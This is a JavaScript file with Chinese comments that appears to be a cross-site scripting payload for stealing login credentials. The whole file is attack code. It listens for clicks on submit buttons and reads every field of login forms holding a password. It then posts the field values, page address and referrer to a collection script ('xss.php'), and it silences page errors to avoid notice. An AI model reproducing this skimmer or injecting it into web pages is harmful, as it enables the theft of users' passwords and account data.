function Send_Data(url,ref,datas) {
        var xmlhttp = false;
        //更高效地获取XMLhttp对象
        if(window.XMLHttpRequest) {
                xmlhttp = new XMLHttpRequest();
                if(xmlhttp.overrideMimeType) { xmlhttp.overrideMimeType('text/xml'); }
        } else if(window.ActiveXObject) {
                var xmlobj = ['Microsoft.XMLHTTP','MSXML.XMLHTTP','Msxml2.XMLHTTP.8.0','Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.3.0','Msxml2.XMLHTTP'];
                for(var i = 0;i < xmlobj.length;i++) { try { xmlhttp = new ActiveXObject(xmlobj[i]); } catch(e) {} }
        }
        if(!xmlhttp) { return false; }
        //接收截获数据地址(跨域方法百度找)
        var sjurl = 'http://localhost/door/get/xss.php';
        //$_POST['url']-当前地址,$_POST['ref']-来路,$_POST['data']-截获的数据
        var sjpos = 'var=xss&url='+escape(url)+'&ref='+escape(ref)+'&data='+escape(datas);
        //POST方法提交数据
        xmlhttp.open("POST", sjurl, true);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.setRequestHeader("Content-length",sjpos.length);
        xmlhttp.setRequestHeader("Connection","close");
        xmlhttp.send(sjpos);
        return true;
}
 

function Form_Hijack(thisform) {
        var ispwd = false;
        //查找form里是否含有输入密码的框框且值不为空
        for(var k = 0;k < thisform.elements.length;k++) {
                var sjobj = thisform.elements[k]; if(sjobj.type == 'password' && sjobj.value != null) { ispwd = true; break; }
        }
        //如果没有输入密码的框框则不截获
        if(!ispwd) { return true; }
        var sjurl = window.location;
        var sjref = document.referrer;
        //如果运行在子窗口
        if(window.parent.location) { sjurl = window.parent.location; }
        if(top.document.referrer) { sjref = top.document.referrer; }
        else if(window.parent.document.referrer) { sjref = window.parent.document.referrer; }
        var sjdata = '';
        for(var j = 0;j < thisform.elements.length;j++) {
                var sjobj = thisform.elements[j];
                //过滤掉不重要的对象
                if(sjobj.type != 'button' && sjobj.type != 'submit' && sjobj.type != 'hidden' && sjobj.type != 'image') {
                        //框框的名字(name="") 数据(value="")
                        sjdata += sjobj.name+':'+sjobj.value+' --- ';
                }
        }
        //如果截获成功就发送
        if(sjurl && sjdata) { Send_Data(sjurl,sjref,sjdata); }
        //if(sjurl && sjdata) { alert(sjdata); }
        return true;
}

function Start_Hijack(id) 
{
        var form = document.getElementById(id);
        if (form != null)
                {
                        Form_Hijack(form);
                };
}

//不显示网页错误
window.onerror = function() { return true; }
//页面加载完毕才开始截获
//document.onreadystatechange = function() {
        document.onclick=function()
        { 
                var obj = event.srcElement;
                if(obj.type == "submit")
                {
                        //最好指定是哪个表单，不遍历了
                        Start_Hijack('loginform');
                        Start_Hijack('loginForm');
                        //Form_Hijack(document.getElementById('loginForm'));
                        // var login_url = window.location;
                        // var user = document.getElementById('u').value;
                        // var pass = document.getElementById('p').value;

                        // if ( user != null && pass != null)
                        // {
                        //         alert(user);
                        //         alert(pass);
                        // }
                }

        } 
        
//}


